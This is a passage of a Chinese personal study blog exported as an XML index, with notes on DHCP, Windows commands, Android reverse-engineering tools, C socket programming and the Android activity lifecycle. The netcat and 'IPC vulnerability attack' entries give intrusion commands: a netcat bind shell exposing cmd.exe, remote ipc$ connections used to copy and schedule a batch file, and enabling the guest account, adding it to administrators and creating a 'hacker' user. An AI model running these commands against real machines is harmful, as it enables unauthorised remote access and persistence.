搭建DHCP服务器首先添加角色和功能下一步基于角色或基于功能安装下一步服务器选择从服务器池中选择服务器选择DHCP服务器即可安装。安装完成后，可能需要重启。重启后，进入管理器。点击DHCP，右键服务器名称，点击DHCP管理进入DHCP管理器在这里我们建立IPV4的DHCP，右击IPV4选择新建域。点击下一步名称和描述可以随意写，我这里写test,test下一步，填写起始IP地址和子网掩码，起始ip地址最好从10开始，而结束ip地址最好是250以前后，因为后面有保留的。这个长度的意思是网络位，子网掩码就是计算网络地址和主机地址的当你填完这些就自动会根据ABCDE网络类型进行自动填充，当然你也可以设置自己的子网。(注意你的ip地址，一定要和你的服务器的ip地址在同一子网，否则就无法在子网广播)下一步，添加排除和延迟，意思就是这些ip为保留ip，不可用。我选择的是5到15这个ip段。下一步，租用期限当主机租的ip到了期限会重新获取ip地址。默认为8天。接着就下一步，由于这里只介绍DHCP服务器搭建，所以其他配置选否。然后完成。紧接着可以选择这个作用域并右键激活。我是用的虚拟机的网卡做的DHCP所以结果如下]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[netcat瑞士军刀]]></title>
    <url>%2F2017%2F05%2F19%2Fforth%2F</url>
    <content type="text"><![CDATA[命令参数connect to somewhere: nc [-options] hostname port[s] [ports] …listen for inbound: nc -l -p port [options] [hostname] [port]options: -d detach from console, background mode -e prog inbound program to exec [dangerous!!] -g gateway source-routing hop point[s], up to 8 -G num source-routing pointer: 4, 8, 12, ... -h this cruft -i secs delay interval for lines sent, ports scanned -l listen mode, for inbound connects -L listen harder, re-listen on socket close -n numeric-only IP addresses, no DNS -o file hex dump of traffic -p port local port number -r randomize local and remote ports -s addr local source address -t answer TELNET negotiation -u UDP mode -v verbose [use twice to be more verbose] -w secs timeout for connects and final net reads -z zero-I/O mode [used for scanning] 用法连接某台电脑的某个端口nc -vv 192.168.83.129 3000监听电脑的某个端口，一般用于反向连接nc -l -p 3000监听端口，并使用telnet连接后执行特定命令nc -l -p 1314 -t -e cmd.exe 作为攻击工具发送恶意代码至80端口type c:\test.txt | nc -nvv 127.0.0.1 80nc -L -p 80 &gt; c:\log.txt得到对方服务器的类别nc -vv http://www.lzhword.cn/提交数据(上传漏洞)nc.exe -vv http://www.lzhword.cn 80 &lt;(重定向) 1.txt]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows命令篇(二)]]></title>
    <url>%2F2017%2F05%2F19%2Fsecond%2F</url>
    <content type="text"><![CDATA[dir命令dir /W 宽屏显示dir /P 分页显示dir /A 显示具有特殊属性dir /S 显示当前目录及其子目录下所有文件。 md命令创建一个新目录 rd命令rd删除目录rd /s 目录名 删除此目录包括当前目录的所有子目录rd /s /q 安静模式 cd命令进入指定目录cd ..回到上级目录 copy命令copy 文件名 文件名 del命令删除文件del 文件名(有空格打双引号） ren命令ren 文件名 新文件名 type命令type 文件名显示文本文件 discopy命令discopy 源驱动名 目的驱动名磁盘复制 chkdsk命令chkdsk H： 检查H盘的类型，磁盘容量等等信息 format命令格式化命令FORMAT volume [/FS:file-system] [/V:label] [/Q] [/L[:state]] [/A:size] [/C] [/I:state] [/X] [/P:passes] [/S:state]FORMAT volume [/V:label] [/Q] [/F:size] [/P:passes]FORMAT volume [/V:label] [/Q] [/T:tracks /N:sectors] [/P:passes]FORMAT volume [/V:label] [/Q] [/P:passes]FORMAT volume [/Q] volume 指定驱动器号(后面跟一个冒号)、 装入点或卷名。 /FS:filesystem 指定文件系统类型(FAT、FAT32、exFAT、 NTFS、UDF、ReFS)。 /V:label 指定卷标。 /Q 执行快速格式化。请注意，此开关可替代 /P。 /C 仅适于 NTFS: 默认情况下，将压缩在该新建卷上创建的 文件。 /X 如果必要，请先强制卸除卷。该卷的所有打开句柄 不再有效。 /R:revision 仅 UDF: 强制格式化为特定的 UDF 版本 (1.02、1.50、2.00、2.01、2.50)。 默认 修订版为 2.01。 /D 仅适用于 UDF 2.50: 将复制元数据。 /L[:state] 仅适用于 NTFS: 覆盖文件记录的默认大小。 默认情况下，非分层卷将使用较小的 文件记录格式化，分层卷将使用较大的 文件记录格式化。/L 和 /L:enable 会强制使用较大的文件记录 格式化，而 /L:disable 会强制使用较小的 文件记录格式化。 /A:size 覆盖默认分配单元大小。 attrib命令ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [+I | -I] [drive:][path][filename] [/S [/D] [/L]] 设置属性。 清除属性。R 只读文件属性。A 存档文件属性。S 系统文件属性。H 隐藏文件属性。I 无内容索引文件属性。X 无清理文件属性。V 完整性属性。[drive:][path][filename]指定 attrib 要处理的文件。/S 处理当前文件夹及其所有子文件夹中的匹配文件。/D 也处理文件夹。/L 处理符号链接和符号链接目标的属性move命令move 源文件名 目的路径命令批处理]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓工具汇总]]></title>
    <url>%2F2017%2F05%2F18%2Ffirst%2F</url>
    <content type="text"><![CDATA[apkTool工具资源反汇编工具目前最新版本是2.2.2常见错误一：Exception in thread “main” brut.androlib.err.UndefinedResObject: resource spec: 0x01030200反编译时遇到标题中的异常，根据描述，原因是找不到资源文件，最有可能的原因是apk中使用了系统资源。解决办法如下：从手机中导出framework-res.apk文件，该文件在/system/framework下面，把这个文件拷到跟apkTool同一个目录下，执行以下语句把资源文件加进去1apktool if framework-res.apk 错误二:使用apktool工具遇到could not decode arsc file的解决办法APKTool不是最新版本导致的。使用方法:1apktool.bat d -f test.apk test 重新编译:1apktool b 文件夹名 name.apk dex2jar工具安卓代码反汇编工具1dex2jar.bat classes.dex 生成classes_dex2jar.jar jd-guijava代码反汇编工具用此软件打开classes_dex2jar.jar即可看到源代码。 安卓签名签名生成: keytool重新签名: jarsigner优化APK：zipalign keytoolKeytool 是一个Java数据证书的管理工具 ,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中在keystore里，包含两种数据:密钥实体（Key entity）-密钥（secret key）或者是私钥和配对公钥（采用非对称加密）可信任的证书实体（trusted certificate entries）-只包含公钥.-genkey 在用户主目录中创建一个默认文件”.keystore”,还会产生一个mykey的别名，mykey中包含用户的公钥、私钥和证书(在没有指定生成位置的情况下,keystore会存在用户系统默认目录)-alias 产生别名 每个keystore都关联这一个独一无二的alias，这个alias通常不区分大小写-keystore 指定密钥库的名称(产生的各类信息将不在.keystore文件中)-keyalg 指定密钥的算法 (如 RSA DSA，默认值为：DSA)-validity 指定创建的证书有效期多少天(默认 90)-keysize 指定密钥长度 （默认 1024）-storepass 指定密钥库的密码(获取keystore信息所需的密码)-keypass 指定别名条目的密码(私钥的密码)-dname 指定证书发行者信息 其中： “CN=名字与姓氏,OU=组织单位名称,O=组织名称,L=城市或区域名 称,ST=州或省份名称,C=单位的两字母国家代码”-list 显示密钥库中的证书信息 keytool -list -v -keystore 指定keystore -storepass 密码-v 显示密钥库中的证书详细信息-export 将别名指定的证书导出到文件 keytool -export -alias 需要导出的别名 -keystore 指定keystore -file 指定导出的证书位置及证书名称 -storepass 密码-file 参数指定导出到文件的文件名-delete 删除密钥库中某条目 keytool -delete -alias 指定需删除的别 -keystore 指定keystore – storepass 密码-printcert 查看导出的证书信息 keytool -printcert -file g:\sso\michael.crt-keypasswd 修改密钥库中指定条目口令 keytool -keypasswd -alias 需修改的别名 -keypass 旧密码 -new 新密码 -storepass keystore密码 -keystore sage-storepasswd 修改keystore口令 keytool -storepasswd -keystore g:\sso\michael.keystore(需修改口令的keystore) -storepass pwdold(原始密码) -new pwdnew(新密码)-import 将已签名数字证书导入密钥库 keytool -import -alias 指定导入条目的别名 -keystore 指定keystore -file 需导入的证书 inputStream与Reader区别java.io下面有两个抽象类：InputStream和ReaderInputStream是表示字节输入流的所有类的超类Reader是用于读取字符流的抽象类InputStream提供的是字节流的读取，而非文本读取，这是和Reader类的根本区别。]]></content>
      <categories>
        <category>安卓</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ipc漏洞攻击]]></title>
    <url>%2F2017%2F05%2F17%2Fsecond%2F</url>
    <content type="text"><![CDATA[扫描端口使用当前最流行的端口扫描工具nmap扫描137,138,139,445端口，看是否开启了这些端口，如果开启了这些端口，说明存在ipc漏洞。 建立漏洞连接net use \192.168.83.129\ipc\$ “password” /U:”liuzhihao”查询共享资源net view \192.168.83.129查询远程ip的当前时间net time \192.168.83.129经过了IPC连接那么就可以复制文件到远程主机上copy i:\1.bat \192.168.83.129\c\$\myjishi再次获取系统时间，为远程主机添加任务计划schtasks /create /tn “test” /tr c:\myjishi\1.bat /sc once /st 09:58:30 /s 192.168.83.129 /u administrator /p liuzhihaoipc漏洞攻击常见错误:ipc$连接失败的常见原因 1 IPC连接是Windows NT及以上系统中特有的功能，由于其需要用到Windows NT中很多DLL函数，所以不能在Windows 9.x/Me系统中运行，也就是说只有nt/2000/xp才可以相互建立ipc$连接，98/me是不能建立ipc$连接的； 2 如果想成功的建立一个ipc$连接，就需要响应方开启ipc$共享，即使是空连接也是这样，如果响应方关闭了ipc$共享，将不能建立连接； 3 连接发起方未启动Lanmanworkstation服务（显示名为：Workstation）：它提供网络链结和通讯，没有它发起方无法发起连接请求； 4 响应方未启动Lanmanserver服务（显示名为：Server）：它提供了 RPC 支持、文件、打印以及命名管道共享，ipc$依赖于此服务，没有它主机将无法响应发起方的连接请求，不过没有它仍可发起ipc$连接； 5 响应方未启动NetLogon，它支持网络上计算机 pass-through 帐户登录身份（不过这种情况好像不多）； 6 响应方的139，445端口未处于监听状态或被防火墙屏蔽； 7 连接发起方未打开139，445端口； 8 用户名或者密码错误：如果发生这样的错误，系统将给你类似于’无法更新密码’这样的错误提示（显然空会话排除这种错误）； 9 命令输入错误：可能多了或少了空格，当用户名和密码中不包含空格时两边的双引号可以省略，如果密码为空，可以直接输入两个引号””即可； 10 如果在已经建立好连接的情况下对方重启计算机，那么ipc$连接将会自动断开，需要重新建立连接。 另外,你也可以根据返回的错误号分析原因： 错误号5，拒绝访问：很可能你使用的用户不是管理员权限的；错误号51，Windows无法找到网络路径：网络有问题；错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）；错误号67，找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$；错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连；错误号1326，未知的用户名或错误密码：原因很明显了；错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动；错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。 schtasksSCHTASKS /Create [/S system [/U username [/P [password]]]] [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day] [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime] [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]] [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?] 描述: 允许管理员在本地或远程系统上创建计划任务。 参数列表: /S system 指定要连接到的远程系统。如果省略这个 系统参数，默认是本地系统。 /U username 指定应在其中执行 SchTasks.exe 的用户上下文。 /P [password] 指定给定用户上下文的密码。如果省略则 提示输入。 /RU username 指定任务在其下运行的“运行方式”用户 帐户(用户上下文)。对于系统帐户，有效 值是 &quot;&quot;、&quot;NT AUTHORITY\SYSTEM&quot; 或 &quot;SYSTEM&quot;。 对于 v2 任务，&quot;NT AUTHORITY\LOCALSERVICE&quot;和 &quot;NT AUTHORITY\NETWORKSERVICE&quot;以及常见的 SID 对这三个也都可用。 /RP [password] 指定“运行方式”用户的密码。要提示输 入密码，值必须是 &quot;*&quot; 或无。系统帐户会忽略该 密码。必须和 /RU 或 /XML 开关一起使用。 /RU/XML /SC schedule 指定计划频率。 有效计划任务: MINUTE、 HOURLY、DAILY、WEEKLY、 MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT. /MO modifier 改进计划类型以允许更好地控制计划重复 周期。有效值列于下面“修改者”部分中。 /D days 指定该周内运行任务的日期。有效值: MON、TUE、WED、THU、FRI、SAT、SUN 和对 MONTHLY 计划的 1 - 31 (某月中的日期)。通配符“*”指定所有日期。 /M months 指定一年内的某月。默认是该月的第一天。 有效值: JAN、FEB、MAR、APR、MAY、JUN、 JUL、 AUG、SEP、OCT、NOV 和 DEC。通配符 “*” 指定所有的月。 /I idletime 指定运行一个已计划的 ONIDLE 任务之前 要等待的空闲时间。 有效值范围: 1 到 999 分钟。 /TN taskname 指定唯一识别这个计划任务的名称。 /TR taskrun 指定在这个计划时间运行的程序的路径 和文件名。 例如: C:\windows\system32\calc.exe /ST starttime 指定运行任务的开始时间。 时间格式为 HH:mm (24 小时时间)，例如 14:30 表示 2:30 PM。如果未指定 /ST，则默认值为 当前时间。/SC ONCE 必需有此选项。 /RI interval 用分钟指定重复间隔。这不适用于 计划类型: MINUTE、HOURLY、 ONSTART, ONLOGON, ONIDLE, ONEVENT. 有效范围: 1 - 599940 分钟。 如果已指定 /ET 或 /DU，则其默认值为 10 分钟。 /ET endtime 指定运行任务的结束时间。 时间格式为 HH:mm (24 小时时间)，例如，14:50 表示 2:50 PM。 这不适用于计划类型: ONSTART、 ONLOGON, ONIDLE, ONEVENT. /DU duration 指定运行任务的持续时间。 时间格式为 HH:mm。这不适用于 /ET 和 计划类型: ONSTART, ONLOGON, ONIDLE, ONEVENT. 对于 /V1 任务，如果已指定 /RI，则持续时间默认值为 1 小时。 /K 在结束时间或持续时间终止任务。 这不适用于计划类型: ONSTART、 ONLOGON, ONIDLE, ONEVENT. 必须指定 /ET 或 /DU。 /SD startdate 指定运行任务的第一个日期。 格式为 yyyy/mm/dd。默认值为 当前日期。这不适用于计划类型: ONCE、 ONSTART, ONLOGON, ONIDLE, ONEVENT. /ED enddate 指定此任务运行的最后一天的日期。 格式是 yyyy/mm/dd。这不适用于计划类型: ONCE、ONSTART、ONLOGON、ONIDLE。 /EC ChannelName 为 OnEvent 触发器指定事件通道。 /IT 仅有在 /RU 用户当前已登录且 作业正在运行时才可以交互式运行任务。 此任务只有在用户已登录的情况下才运行。 /NP 不储存任何密码。任务以给定用户的身份 非交互的方式运行。只有本地资源可用。 /Z 标记在最终运行完任务后删除任务。 /XML xmlfile 从文件的指定任务 XML 中创建任务。 可以组合使用 /RU 和 /RP 开关，或者在任务 XML 已包含 主体时单独使用 /RP。 /V1 创建 Vista 以前的平台可以看见的任务。 不兼容 /XML。 /F 如果指定的任务已经存在，则强制创建 任务并抑制警告。 /RL level 为作业设置运行级别。有效值为 LIMITED 和 HIGHEST。默认值为 LIMITED。 /DELAY delaytime 指定触发触发器后延迟任务运行的 等待时间。时间格式为 mmmm:ss。此选项仅对计划类型 ONSTART, ONLOGON, ONEVENT. /HRESULT 为获得更出色的故障诊断能力，处理退出代码 将采用 HRESULT 格式。 /? 显示此帮助消息。 修改者: 按计划类型的 /MO 开关的有效值: MINUTE: 1 到 1439 分钟。 HOURLY: 1 - 23 小时。 DAILY: 1 到 365 天。 WEEKLY: 1 到 52 周。 ONCE: 无修改者。 ONSTART: 无修改者。 ONLOGON: 无修改者。 ONIDLE: 无修改者。 MONTHLY: 1 到 12，或 FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。 ONEVENT: XPath 事件查询字符串。 示例: ==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;doc&quot;， 该机器每小时在 &quot;runasuser&quot; 用户下运行 notepad.exe。 SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC HOURLY /TN doc /TR notepad ==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;accountant&quot;， 在指定的开始日期和结束日期之间的开始时间和结束时间内， 每隔五分钟运行 calc.exe。 SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00 /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword ==&gt; 创建计划任务 &quot;gametime&quot;，在每月的第一个星期天 运行“空当接龙”。 SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime /TR c:\windows\system32\freecell ==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;report&quot;， 每个星期运行 notepad.exe。 SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC WEEKLY /TN report /TR notepad.exe ==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;logtracker&quot;， 每隔五分钟从指定的开始时间到无结束时间， 运行 notepad.exe。将提示输入 /RP 密码。 SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN logtracker /TR c:\windows\system32\notepad.exe /ST 18:30 /RU runasuser /RP ==&gt; 创建计划任务 &quot;gaming&quot;，每天从 12:00 点开始到 14:00 点自动结束，运行 freecell.exe。 SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00 /ET 14:00 /K ==&gt; 创建计划任务“EventLog”以开始运行 wevtvwr.msc 只要在“系统”通道中发布事件 101 SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT /EC System /MO *[System/EventID=101] ==&gt; 文件路径中可以加入空格，但需要加上两组引号， 一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD 的外部引号必须是一对双引号；内部引号可以是一对单引号或 一对转义双引号: SCHTASKS /Create /tr &quot;&apos;c:\program files\internet explorer\iexplorer.exe&apos; \&quot;c:\log data\today.xml\&quot;&quot; ... cmd命令提升之管理员runas /user:administrator cmd输入密码即可]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ping命令]]></title>
    <url>%2F2017%2F05%2F17%2Ffirst%2F</url>
    <content type="text"><![CDATA[ping命令参数-t 不停的ping-a 将地址解析为主机名-n count 要发送的回显请求数。-l size 发送缓冲区的大小。最大字节65500-i TTL 生存时间-r count 记录计数跃点的路由-s count 计数跃点的时间戳-4 强制使用IPV4-6 强制使用IPv6window2000 TTL=128windows TTL=64Linux TTL=225 net命令1)建立空连接:net use \IP\ipc\$ “” /user:”” (一定要注意:这一行命令中包含了3个空格) 2)建立非空连接:net use \IP\ipc\$ “用户名” /user:”密码” (同样有3个空格) 3)映射默认共享:net use z: \IP\c\$ “密码” /user:”用户名” (即可将对方的c盘映射为自己的z盘，其他盘类推)如果已经和目标建立了ipc\$，则可以直接用IP+盘符+\$访问,具体命令 net use z: \IP\c\$ 4)删除一个ipc\$连接net use \IP\ipc\$ /del 5)删除共享映射net use Z: /del 删除映射的c盘，其他盘类推net use * /del 删除全部,会有提示要求按y确认 6). C:>net user guest /active:yes将对方的Guest用户激活 7). C:>net user guest 1234将Guest的密码改为1234,或者你要设定的密码 8). C:>net localgroup administrators guest /add将Guest变为Administrator net user hacker 1234 /addnet share c\$ /deletenet share admin\$ /delete 进程命令tasklist taskkilltaskkill /PID 进程号 /ftaskkill /IM 映像名称 /ftaskkill /S system /U username /P password /FI “IMAGENAME eq note*”shutdown /r /t 600 /f 注销shutdown /a 取消shutdown /s /t 600 /f 关机shutdown /s /t 600 /f /c “注释” 关机并提示 nslookup命令域名A记录www.lzhword.cnMX记录mail.lzhword.cnNS记录查询A记录nslookup -qt=A lzhword.cn查询MX记录nslookup -qt=A lzhword.cn for命令for /f “tokens=1,2,3 delims=-“ %a in (‘date /t’) do @echo %b%c%afor %a in (c: d: e: f:) do @dir %a | find “可用字节”for %a in (.txt) do type %a/r 遍历这个目录树/f 参数将文本文件内容作为循环范围/f 参数将某一命令执行结果作为循环范围可以用%~操作符将文件名分离成文件名、扩展名、盘符等独立部分。for /r %a in (.txt) do @find “microsoft” %afor /r %a in(.) do @if exist %a\CVS rd /s /q %a\CVSfor /f %a in (todel.txt) do del %afor /f “skip=5(跳过前五行) tokens=5(分隔符)” %a in (todel.txt) do @if exist %a DEL %afor /r F:\ %a in (.mp3) do @echo %~nafor /r F: %a in (.mp3) do dir “%a” /b /s]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言网络编程]]></title>
    <url>%2F2017%2F05%2F16%2Ffirst%2F</url>
    <content type="text"><![CDATA[网络编程头文件winsock2.h 需要包含WS2_32.libwinsock.h 需要包含WSOCK32.libMSWSOCK.h 需要包含MSWSOCK.dll宏指定参数MAKEWORD(x,y) wVersionRequested,服务器一个进程socket()/WSASocket() -&gt; 绑定(bind) -&gt; 监听(listen) -&gt; Accept/WSAAccept()客户机进程socket()/WSASocket() -&gt; 地址解析 -&gt; Connect()/WSAConnect()客户端初始化一个套接字链接，向服务器发送SYN包，同时客户机将套接字置为SYN_SENT,服务器收到SYN包后回一个SYN-ACK客户机再回一个ACK，客户机此时状态置为ESTABLTSHED,如果服务器拒绝或超时，客户机自动变为close状态。如果服务器的套接字从本地接口的端口绑定起来变为监听状态 LISTENING。主动关闭套接字会发送一个FIN包，套接字状态置为FIN_WAIT_1或FIN_WAIT_2或TIME_WAIT。send/WSASendWSASendDisconnectrecv/WSARecvWSARecvDisconnectshutdownclosesocket 反向连接客户端不断发送连接请求定义需要连接服务器的必要信息sockaddr_in结构体结构体包括以下数据sin_family ip类型AF_INET是ipv4 AF_INET6是ipv6sin_addr.s_addr ip地址(htonl转换网络地址)sin_port 需要连接的端口(htons转换端口)加载套接字库WSAStartup(MAKEWORD(2,2),&amp;wsadata);第一个参数是版本的意思2.2定义特定的套接字SOCKET sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);//TCP的ipv4的套接字SOCK_STREAM TCPSOCK_DGRAM UDPSOCK_RAW 原始（接收所有数据包，嗅探）通信协议 IPPROTO_TCP把套接字连接到外部服务器connect(sock,(struct sockaddr*)&amp;sai,sizeof(struct sockaddr));如果连接成功就发送信息send(sock,Banner,sizeof(Banner),0);//Banner是发送的内容recv(sock,PassBuf,sizeof(PassBuf)-1,0);//PassBuf是接收消息的内容 strnicmpstrnicmp(str1,str2,int);比较str1和str2的前n个字符串字典序的大小，但是不区分字母大小写，当str1&lt;str2时，返回值是-1 ; 当str1=str2时，返回值是0; 当str1&gt;str2时，返回值是1。 DWORDdword一个word两个字节，dword两个word四个字节。 SECURITY_ATTRIBUTESSECURITY_ATTRIBUTES结构包含一个对象的安全描述符，并指定检索到指定这个结构的句柄是否是可继承的。这个结构为很多函数创建对象是提供安全性设置。 CreateThread该函数在主线程的基础上创建一个新线程.MSDN中CreateThread原型：HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,//SDSIZE_T dwStackSize,//初始栈大小LPTHREAD_START_ROUTINE lpStartAddress,//线程函数的指针LPVOID lpParameter,//向线程函数传递参数DWORD dwCreationFlags,//CREATE_SUSPENDED创建一个挂起的线程，0:表示创建后立即激活LPDWORD lpThreadId//保存新线程的ID使用closeHandle关闭对象。 LPVOIDLPVOID,是一个没有类型的指针，也就是说你可以将LPVOID类型的变量赋值给任意类型的指针，比如在参数传递时就可以把任意类型传递给一个LPVOID类型为参数的方法，然后在方法内再将这个“任意类型”从传递时的“LPVOID类型”转换回来。 STARTUPINFOSTARTUPINFO用于指定新进程的主窗口特性的一个结构。typedef struct _STARTUPINFO {DWORD cb;LPTSTR lpReserved;LPTSTR lpDesktop; //用于标识启动应用程序所在的桌面的名字。LPTSTR lpTitle;//用于设定控制台窗口的名称。DWORD dwX;DWORD dwY; //用于设定应用程序窗口在屏幕上应该放置的位置的x 和y 坐标DWORD dwXSize;DWORD dwYSize; //用于设定应用程序窗口的宽度和长度DWORD dwXCountChars;DWORD dwYCountChars;//用于设定子应用程序的控制台窗口的宽度和高度DWORD dwFillAttribute;//用于设定子应用程序的控制台窗口使用的文本和背景颜色DWORD dwFlags;WORD wShowWindow;WORD cbReserved2; //保留。必须被初始化为0LPBYTE lpReserved2;//保留。必须被初始化为NULLHANDLE hStdInput;HANDLE hStdOutput;//用于设定供控制台输入和输出用的缓存的句柄。HANDLE hStdError;} STARTUPINFO, *LPSTARTUPINFO; GetSystemDirectoryGetSystemDirectory获取系统目录 PROCESS_INFORMATION在创建进程时相关的数据结构之一，该结构返回有关新进程及其主线程的信息。 CreateProcessCreateProcess用来创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件。BOOL CreateProcess(LPCTSTR lpApplicationName,LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATIONlpProcessInformation);lpApplicationName指向一个NULL结尾的、用来指定可执行模块的字符串。lpCommandLine指向一个以NULL结尾的字符串，该字符串指定要执行的命令行。lpProcessAttributes指向一个SECURITY_ATTRIBUTES结构体，这个结构体决定是否返回的句柄可以被子进程继承。如果lpProcessAttributes参数为空（NULL），那么句柄不能被继承。lpThreadAttributes同lpProcessAttribute,不过这个参数决定的是线程是否被继承.通常置为NULL.bInheritHandles指示新进程是否从调用进程处继承了句柄。 ReadFileBOOL ReadFile( HANDLE hFile, //文件的句柄 LPVOID lpBuffer, //用于保存读入数据的一个缓冲区 DWORD nNumberOfBytesToRead, //要读入的字节数 LPDWORD lpNumberOfBytesRead, //指向实际读取字节数的指针 LPOVERLAPPED lpOverlapped //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。 //该结构定义了一次异步读取操作。否则，应将这个参数设为NULL);]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[activity生命周期]]></title>
    <url>%2F2017%2F05%2F15%2Fsecond%2F</url>
    <content type="text"><![CDATA[activity熟悉javaEE的朋友们都了解servlet技术，我们想要实现一个自己的servlet，需要继承相应的基类，重写它的方法，这些方法会在合适的时间被servlet容器调用。其实Android中的Activity运行机制跟servlet有些相似之处，Android系统相当于servlet容器，Activity相当于一个servlet，我们的Activity处在这个容器中，一切创建实例、初始化、销毁实例等过程都是容器来调用的。生命周期图:1、启动activity：系统会先调用onCreate方法,然后调用onStart方法，最后调用onResume,activity进入运行状态。2、当前activity被其他activity覆盖其上或被锁屏:系统会调用onPause方法，暂停当前activity的执行。3、当前activity由被覆盖状态回到前台或解锁屏:系统会调用onResume方法，再次进入运行状态。4、当前activity转到新的activity界面或Home键回到主屏，自身退居后台:系统会先调用onPause方法，然后调用onStop方法，进入停滞状态。5、用户后退回到activity:系统会先调用onRestart方法，然后调用onStart方法，最后调用onResume方法，再次进入运行状态。6、当前activity处于被覆盖状态或者后台不可见状态，即第2步和第4步，系统内存不足，杀死当前activity，而后用户退回当前activity:再次调用onCreate方法、onStart方法，onResume方法，进入运行状态。7、用户退出当前activity:系统先调用onPause方法，然后调用onStop方法，最后调用onDestory方法，结束当前activity。测试代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109package com.scott.lifecycle; import android.app.Activity; import android.content.Context; import android.content.Intent; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; public class LifeCycleActivity extends Activity &#123; private static final String TAG = "LifeCycleActivity"; private Context context = this; private int param = 1; //Activity创建时被调用 @Override public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); Log.i(TAG, "onCreate called."); setContentView(R.layout.lifecycle); Button btn = (Button) findViewById(R.id.btn); btn.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent = new Intent(context, TargetActivity.class); startActivity(intent); &#125; &#125;); &#125; //Activity创建或者从后台重新回到前台时被调用 @Override protected void onStart() &#123; super.onStart(); Log.i(TAG, "onStart called."); &#125; //Activity从后台重新回到前台时被调用 @Override protected void onRestart() &#123; super.onRestart(); Log.i(TAG, "onRestart called."); &#125; //Activity创建或者从被覆盖、后台重新回到前台时被调用 @Override protected void onResume() &#123; super.onResume(); Log.i(TAG, "onResume called."); &#125; //Activity窗口获得或失去焦点时被调用,在onResume之后或onPause之后 /*@Override public void onWindowFocusChanged(boolean hasFocus) &#123; super.onWindowFocusChanged(hasFocus); Log.i(TAG, "onWindowFocusChanged called."); &#125;*/ //Activity被覆盖到下面或者锁屏时被调用 @Override protected void onPause() &#123; super.onPause(); Log.i(TAG, "onPause called."); //有可能在执行完onPause或onStop后,系统资源紧张将Activity杀死,所以有必要在此保存持久数据 &#125; //退出当前Activity或者跳转到新Activity时被调用 @Override protected void onStop() &#123; super.onStop(); Log.i(TAG, "onStop called."); &#125; //退出当前Activity时被调用,调用之后Activity就结束了 @Override protected void onDestroy() &#123; super.onDestroy(); Log.i(TAG, "onDestory called."); &#125; /** * Activity被系统杀死时被调用. * 例如:屏幕方向改变时,Activity被销毁再重建;当前Activity处于后台,系统资源紧张将其杀死. * 另外,当跳转到其他Activity或者按Home键回到主屏时该方法也会被调用,系统是为了保存当前View组件的状态. * 在onPause之前被调用. */ @Override protected void onSaveInstanceState(Bundle outState) &#123; outState.putInt("param", param); Log.i(TAG, "onSaveInstanceState called. put param: " + param); super.onSaveInstanceState(outState); &#125; /** * Activity被系统杀死后再重建时被调用. * 例如:屏幕方向改变时,Activity被销毁再重建;当前Activity处于后台,系统资源紧张将其杀死,用户又启动该Activity. * 这两种情况下onRestoreInstanceState都会被调用,在onStart之后. */ @Override protected void onRestoreInstanceState(Bundle savedInstanceState) &#123; param = 